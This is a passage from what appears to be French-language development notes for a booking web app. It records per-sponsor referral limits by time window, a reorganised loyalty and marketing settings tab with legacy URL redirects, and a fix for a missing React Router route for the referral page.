  Avant de créer une ligne `referral_uses`, on compte les parrainages
  pending+validated du parrain sur la fenêtre concernée :
  - `lifetime`  → COUNT total
  - `month`     → `created_at >= date_trunc('month', NOW())`
  - `3months`   → `created_at >= NOW() - INTERVAL '90 days'`
  - `year`      → `created_at >= date_trunc('year', NOW())`
  Si compteur ≥ `limit_count` → on n'insère pas `referral_uses` (silencieux,
  le RDV passe quand même).

### Frontend — `pages/settings/TabMarketing.jsx`
- **Onglets nettoyés** : suppression de `🎂 Anniv.` et `🤝 Parrain.` séparés.
  La nav top a maintenant `💎 Fidelite | % Promos | Solde | ✨ IA`.
- **Nouveau composant `TabFidelite`** : 3 accordéons fermés par défaut :
  1. 💎 Programme de fidélité (tampons / points) — wraps `<TabLoyalty>`
  2. 🎂 Offres anniversaire — wraps `<TabBirthday>`
  3. 🤝 Programme de parrainage — wraps `<TabReferral>`
  Chaque accordéon est un sous-composant `<FideliteAccordion>` réutilisable.
- **Redirection legacy** : un `useEffect` détecte les URLs
  `/settings/marketing/anniversaire` et `/parrainage` et redirige
  silencieusement vers `/fidelite` (pas de 404 sur les anciens liens).
- **`TabReferral`** : nouvelle section "Limite par parrain" avec sélecteur
  période (illimité / 1× à vie / X par mois / X sur 3 mois / X par an) +
  champ nombre conditionnel (caché si Illimité ou À vie).

### Frontend — `pages/booking/ReferralPage.jsx`
- **Maquette 1 (non connecté)** : section Conditions affiche désormais le
  vrai libellé de la limite via `limitPeriodLabel(refProgram)` au lieu de
  l'ancien fallback `monthly_limit`.
- **Maquette 2 (connecté)** : bandeau quota orange recalculé en fonction de
  `limit_period` :
  - `lifetime` → "à vie", pas de date de recharge
  - `month`    → "ce mois-ci", recharge fin de mois
  - `3months`  → "sur 3 mois", recharge dans 90j
  - `year`     → "cette année", recharge 31 décembre
  Calcul local : compte les `pending`+`validated` de `refMyHistory` sur la
  fenêtre courante côté client (cohérent avec la garde backend).

### Build
- `node --check` backend × 4 : OK
- `npx vite build` : OK (13.30s, 87 modules, page-settings +2.5 kB pour
  TabFidelite + UI limite, page-booking +0.8 kB pour le calcul quota
  multi-période)

### Compatibilité préservée
- Anciens parrainages déjà créés : `limit_period` = 'unlimited' par défaut,
  donc aucun blocage rétroactif.
- URLs `/settings/marketing/anniversaire` et `/parrainage` redirigent vers
  `/fidelite` (pas de bookmark cassé).
- Logique paiement caisse / stats / commissions : inchangée (la limite
  n'affecte que l'INSERT dans `referral_uses`, le RDV est toujours créé).

---

## 🆕 Session 2026-04-19 (suite 7) : Fix route /parrain manquante + rename bouton

### Bug
Quand l'utilisateur cliquait sur « Parrainer un ami » (nav ou bouton mobile),
la page semblait clignoter puis redirigeait vers `/book/<commerçant>`.

### Cause
La route `/book/:slug/parrain` **n'était pas déclarée** dans `index.jsx`.
- React Router tombait dans le catch-all `<Route path="/*" element={<RootSwitch/>}>`.
- Sur le domaine commerçant : `<App />` se montait à la place (puis redirigeait).
- Sur le domaine booking public : `<Navigate to="/book/<slug>" replace />` →
  retour à l'accueil.

`navigate('/book/${slug}/parrain')` changeait bien l'URL et `setView('parrain')`
le state local, mais le routeur démontait `BookingPage` au profit du catch-all
→ effet « page qui clignote puis redirige ».

### Fix — `frontend/src/index.jsx`
Ajout de la route manquante :
```jsx
<Route path="/book/:slug/parrain" element={<BookingPageWrapper />} />
```

### Renommage du bouton (demande utilisateur)
- NavBar desktop (`pages/booking/NavBar.jsx`) :
  « Parrainer un ami » → **« Programme parrainage »**
- Bouton mobile bk-mo (`pages/BookingPage.jsx`) :
  « 🤝 Parrainer un ami » → **« 🤝 Programme parrainage »**
- `whiteSpace:'nowrap'` ajouté sur les boutons de nav pour garantir l'affichage
  sur une seule ligne (évite les retours à la ligne sur écrans étroits).

### Build
- `npx vite build` : OK (22.17s, 87 modules)
